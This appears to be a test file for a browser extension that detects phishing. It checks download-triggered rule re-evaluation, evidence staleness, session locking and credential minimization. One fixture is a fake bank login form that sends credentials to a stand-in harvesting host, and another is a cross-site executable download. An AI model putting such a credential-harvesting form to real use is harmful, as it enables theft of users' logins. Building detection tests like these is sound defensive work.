/**
 * DEC-45 — download-triggered re-pass (DEFECT-41 Option A), tested through the
 * REAL SW-path composition (EvidenceCache + runDownloadRepass + the session
 * lock), not a hand-composed engine call. Proves the four properties the ruling
 * binds:
 *   1. DL-01 fires end-to-end: a page pass commits a primary finding, the
 *      download re-pass reuses the cached page evidence + the download, DL-01 fires.
 *   2. The staleness bound EXCLUDES old cached evidence (re-pass skipped), while
 *      evidence within the bound still runs — proving it is the AGE that excludes it.
 *   3. The per-session #withKeyLock prevents a lost update when a content-script
 *      pass and a download re-pass commit on the same session concurrently.
 *   4. No credential-adjacent data ever enters the cache — a dedicated assertion,
 *      not absence-of-failure.
 *
 * Runs under `node --experimental-strip-types` with an in-memory backend + jsdom.
 *   node --experimental-strip-types apps/extension/download-repass.test.ts
 */

import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import { JSDOM } from 'jsdom';

import { SessionStore, type SessionStorageBackend, type SessionKeyParts } from './session-store.ts';
import {
  runPassInSession, runDownloadRepass, EvidenceCache, EVIDENCE_CACHE_MAX_AGE_MS,
} from './session-pass.ts';
import {
  collectUrl, collectDomainRepresentation, collectTransport,
  collectLoginInterface, collectScriptRuntime,
} from './collect-evidence.ts';
import { assembleEvidence, type CollectedParts } from './assemble-evidence.ts';
import { computeDownloadContextEvidence, type DownloadRecord } from './download-context.ts';
import type { RuleSet } from '../../packages/contracts/ruleset.format.v1.ts';
import type { AuthStoreReader } from '../../packages/contracts/boundary.interfaces.v1.ts';

const REPO = join(dirname(fileURLToPath(import.meta.url)), '..', '..');
const ruleSet = JSON.parse(readFileSync(join(REPO, 'rulesets', 'rules-v0.1.0.json'), 'utf8')) as RuleSet;

// The live content script now supplies a page title, so authContext is evaluable
// — a real (empty) reader stands in for the store: it responds, finds nothing,
// and CRED-02 stays silent. (A throwing reader would fire on the consult.)
const emptyStore: AuthStoreReader = {
  lookup: async () => ({
    status: 'available' as const, originPresent: false,
    lifecycleState: null, fingerprintDrift: null, bestCrossOriginMatch: null,
  }),
};

function memoryBackend(delayInSet = false): SessionStorageBackend {
  const m = new Map<string, unknown>();
  return {
    async get(keys) {
      if (keys === null) return Object.fromEntries(m);
      const arr = Array.isArray(keys) ? keys : [keys];
      const out: Record<string, unknown> = {};
      for (const k of arr) if (m.has(k)) out[k] = m.get(k);
      return out;
    },
    async set(items) {
      if (delayInSet) await new Promise((r) => setTimeout(r, 0));
      for (const [k, v] of Object.entries(items)) m.set(k, JSON.parse(JSON.stringify(v)));
    },
    async remove(keys) {
      const arr = Array.isArray(keys) ? keys : [keys];
      for (const k of arr) m.delete(k);
    },
  };
}

// A login page whose inputs carry SECRET values, so the minimization test can
// prove those values never reach the cache. Action is off-origin -> CRED-01.
const PW_VALUE = 'hunter2-SUPER-SECRET-uniq-9c4f';
const USER_VALUE = 'alice-USERNAME-uniq-3a71';
const LOGIN_HTML = `<!doctype html><html><head><title>Acme Bank Sign In</title></head><body>
  <form method="POST" action="https://evil-collect.example/harvest">
    <input type="text" name="username" autocomplete="username" value="${USER_VALUE}">
    <input type="password" name="password" autocomplete="current-password" value="${PW_VALUE}">
    <button type="submit">Sign in</button>
  </form></body></html>`;
const PAGE_URL = 'https://accounts.acmebank.example/login';

function loginParts(): CollectedParts {
  const dom = new JSDOM(LOGIN_HTML, { url: PAGE_URL });
  const doc = dom.window.document;
  return {
    url: collectUrl(PAGE_URL),
    domainRepresentation: collectDomainRepresentation(PAGE_URL),
    transport: collectTransport(new URL(PAGE_URL).protocol),
    loginInterface: collectLoginInterface(doc as unknown as ParentNode, doc.baseURI, () => false, doc.title),
    scriptRuntime: collectScriptRuntime({ transmissionEndpoints: [], dynamicScriptOrigins: [] }),
  };
}

const BENIGN_URL = 'https://plain.example/home';
function benignParts(): CollectedParts {
  const dom = new JSDOM('<!doctype html><html><head><title>Home</title></head><body><p>hi</p></body></html>', { url: BENIGN_URL });
  const doc = dom.window.document;
  return {
    url: collectUrl(BENIGN_URL),
    domainRepresentation: collectDomainRepresentation(BENIGN_URL),
    transport: collectTransport('https:'),
    loginInterface: collectLoginInterface(doc as unknown as ParentNode, doc.baseURI, () => false, doc.title),
    scriptRuntime: collectScriptRuntime({ transmissionEndpoints: [], dynamicScriptOrigins: [] }),
  };
}

/** A cross-site executable download referred from the login page. */
function exeDownload(): DownloadRecord {
  return {
    url: 'https://cdn.evil.tld/installer.exe', filename: 'installer.exe',
    mime: 'application/x-msdownload', referrer: PAGE_URL, observedAt: 1,
  };
}

const fired = (o: { findings: readonly { ruleId: string }[] }, id: string) => o.findings.some((f) => f.ruleId === id);

// ══ 1. DL-01 fires end-to-end through the download re-pass path ═════════════
{
  const store = new SessionStore(memoryBackend());
  const cache = new EvidenceCache();
  const parts: SessionKeyParts = { tabId: 1, navigationId: 1000 };
  await store.startSession(parts, PAGE_URL, '2026-09-04', 'DOC-1');

  // Page pass: the login page fires CRED-01 (primary), committed into the session.
  const p1 = await runPassInSession({
    store, parts, evidence: assembleEvidence(loginParts(), PAGE_URL, '2026-09-04'),
    ruleSet, storeReader: emptyStore,
  });
  assert.ok(fired(p1, 'CRED-01'), `page pass must fire CRED-01; got [${p1.findings.map((f) => f.ruleId).join(', ')}]`);
  const after = await store.getSession(parts);
  assert.equal(after?.priorPassState?.anyPriorPrimaryFindingActive, true, 'primary finding must commit the session flag');

  // The SW caches the raw content-script parts at this point.
  const at = 10_000_000;
  cache.remember(parts, loginParts(), at);

  // A download arrives -> the re-pass reuses the cached page evidence + the download.
  const result = await runDownloadRepass({
    store, cache, parts, downloadContext: computeDownloadContextEvidence(exeDownload()),
    ruleSet, storeReader: emptyStore, now: at + 5_000, collectedOn: '2026-09-04',
  });
  assert.ok(result.status === 'ran', `re-pass must run; got ${JSON.stringify(result)}`);
  assert.ok(fired(result.outcome, 'DL-01'),
    `DL-01 must FIRE via the download re-pass path; fired [${result.outcome.findings.map((f) => f.ruleId).join(', ')}]`);
  console.log('  [1] download re-pass: page CRED-01 -> cache -> download re-pass DL-01 FIRES ✓');
}

// ══ 2. Staleness bound excludes old evidence ═══════════════════════════════
{
  const store = new SessionStore(memoryBackend());
  const cache = new EvidenceCache();
  const parts: SessionKeyParts = { tabId: 2, navigationId: 2000 };
  await store.startSession(parts, PAGE_URL, '2026-09-04', 'DOC-2');
  await runPassInSession({ store, parts, evidence: assembleEvidence(loginParts(), PAGE_URL, '2026-09-04'), ruleSet, storeReader: emptyStore });

  const collectedAt = 5_000_000;
  cache.remember(parts, loginParts(), collectedAt);

  const stale = await runDownloadRepass({
    store, cache, parts, downloadContext: computeDownloadContextEvidence(exeDownload()),
    ruleSet, storeReader: emptyStore, now: collectedAt + EVIDENCE_CACHE_MAX_AGE_MS + 1, collectedOn: '2026-09-04',
  });
  assert.equal(stale.status, 'skipped', `stale evidence must SKIP the re-pass; got ${JSON.stringify(stale)}`);
  assert.equal(stale.status === 'skipped' ? stale.reason : '', 'evidence_stale', 'skip reason must be evidence_stale');

  const fresh = await runDownloadRepass({
    store, cache, parts, downloadContext: computeDownloadContextEvidence(exeDownload()),
    ruleSet, storeReader: emptyStore, now: collectedAt + EVIDENCE_CACHE_MAX_AGE_MS - 1, collectedOn: '2026-09-04',
  });
  assert.equal(fresh.status, 'ran', 'evidence within the bound must still run — proving it is the AGE that excluded the stale one');
  console.log(`  [2] staleness: >${EVIDENCE_CACHE_MAX_AGE_MS}ms SKIPS (evidence_stale); within bound runs ✓`);
}

// ══ 3. Session lock prevents a lost update on concurrent commits ═══════════
{
  const store = new SessionStore(memoryBackend(true)); // delay in set widens the race window
  const parts: SessionKeyParts = { tabId: 3, navigationId: 3000 };
  await store.startSession(parts, PAGE_URL, '2026-09-04', 'DOC-3');

  // Two passes on the SAME session, launched concurrently:
  //  A) the login page — a PRIMARY finding (sets anyPriorPrimaryFindingActive)
  //  B) a benign page that PRESENTED AN INTERVENTION (sets interventionPresented)
  // Without the per-key lock, one commit's read-modify-write clobbers the other.
  const [a, b] = await Promise.all([
    runPassInSession({ store, parts, evidence: assembleEvidence(loginParts(), PAGE_URL, '2026-09-04'), ruleSet, storeReader: emptyStore }),
    runPassInSession({ store, parts, evidence: assembleEvidence(benignParts(), BENIGN_URL, '2026-09-04'), ruleSet, storeReader: emptyStore, interventionWasPresented: true }),
  ]);
  assert.ok(fired(a, 'CRED-01'), 'pass A fired CRED-01');
  void b;
  const s = await store.getSession(parts);
  assert.equal(s?.priorPassState?.anyPriorPrimaryFindingActive, true,
    'the primary-finding commit must SURVIVE the concurrent intervention commit (no lost update)');
  assert.equal(s?.priorPassState?.interventionPresented, true,
    'the intervention commit must SURVIVE the concurrent primary-finding commit (no lost update)');
  console.log('  [3] session lock: concurrent primary-finding + intervention passes both commit, no lost update ✓');
}

// ══ 4. No credential-adjacent data ever enters the cache ═══════════════════
{
  const cache = new EvidenceCache();
  const parts: SessionKeyParts = { tabId: 4, navigationId: 4000 };
  cache.remember(parts, loginParts(), 1);
  const entry = cache.get(parts);
  assert.ok(entry !== null, 'evidence was cached');

  const serialized = JSON.stringify(entry);
  assert.ok(!serialized.includes(PW_VALUE), 'the cache must NOT contain the password value');
  assert.ok(!serialized.includes(USER_VALUE), 'the cache must NOT contain the username value');

  // Structural proof: every cached field exposes ONLY {kind, hidden, autocompleteDisabled} — no value key.
  const forms = entry!.parts.loginInterface.forms;
  assert.equal(forms.state, 'present', 'forms present');
  if (forms.state === 'present') {
    for (const f of forms.value) {
      for (const fld of f.fields) {
        assert.deepEqual(Object.keys(fld).sort(), ['autocompleteDisabled', 'hidden', 'kind'],
          `a cached field must expose ONLY {kind,hidden,autocompleteDisabled}; got ${Object.keys(fld).join(',')}`);
      }
    }
  }

  // What IS cached is the safe, minimized shape: the fingerprint carries
  // page-TITLE tokens (not credential-adjacent), never a field value.
  const fp = entry!.parts.loginInterface.fingerprint;
  assert.equal(fp.state, 'present', 'fingerprint present (title supplied by the live collector)');
  if (fp.state === 'present') {
    assert.ok(fp.value.titleTokens.length > 0, 'title tokens present (page title, minimized)');
    assert.ok(!JSON.stringify(fp.value).includes(PW_VALUE), 'the fingerprint must not carry the credential value');
  }
  console.log('  [4] minimization: no credential value in the cache; fields expose only {kind,hidden,autocompleteDisabled} ✓');
}

console.log('DEC-45 download re-pass PROVEN: DL-01 fires end-to-end through the cache + re-pass path; '
  + 'the staleness bound excludes aged evidence; the per-session lock prevents a lost update on concurrent '
  + 'commits; and no credential-adjacent data enters the cache.');
